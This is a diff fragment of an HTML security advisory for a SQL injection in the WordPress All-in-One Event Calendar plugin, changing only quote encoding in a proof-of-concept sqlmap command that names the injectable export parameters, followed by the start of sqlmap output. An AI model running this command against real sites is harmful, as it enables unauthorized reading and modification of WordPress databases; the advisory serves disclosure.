@@ -139,7 +139,7 @@ By exploiting this vulnerability, a user is able to read or modify the whole Wor
 <p><strong>Proof of concept:</strong></p>
 <p>To exploit this SQL-Injection through sqlmap (<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>):
 Prerequisite: You need at least one event</p>
-<pre tabindex="0"><code>python sqlmap.py --url &quot;http://IP/wordpress/?plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=&quot; -p ai1ec_tag_ids,ai1ec_post_ids,ai1ec_cat_ids --risk 3 --level 3 --dbms mysql
+<pre tabindex="0"><code>python sqlmap.py --url &#34;http://IP/wordpress/?plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=&#34; -p ai1ec_tag_ids,ai1ec_post_ids,ai1ec_cat_ids --risk 3 --level 3 --dbms mysql
 </code></pre><p><strong>sqlmap Output:</strong></p>
 <pre tabindex="0"><code>Place: GET
 Parameter: ai1ec_cat_ids
